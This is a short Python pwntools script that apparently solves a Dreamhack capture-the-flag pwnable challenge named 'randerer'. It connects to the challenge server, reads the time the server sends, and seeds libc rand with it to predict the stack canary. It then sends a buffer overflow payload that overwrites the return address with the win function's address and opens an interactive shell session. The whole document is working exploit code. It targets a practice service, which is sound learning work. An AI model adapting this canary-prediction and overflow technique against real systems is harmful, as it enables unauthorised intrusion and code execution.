from pwn import *
from ctypes import *

port = 17882
rem = remote("host3.dreamhack.games", port)
dll = CDLL("/lib/x86_64-linux-gnu/libc.so.6")

elf = ELF("./Pwnable/randerer/problem/deploy/prob")

win_addr = elf.symbols['win']

rem.recvuntil(b"time: ")
t = int(rem.recvline().rstrip().decode())

canary = 0
dll.srand(t)
for i in range(8):
  tmp = canary << 8
  canary = tmp | (dll.rand() & 0xff)

payload = b"A" * 16 + p64(canary) + b"B" * 16 + p64(win_addr + 5)
rem.sendlineafter(b"data: ", payload)

rem.interactive()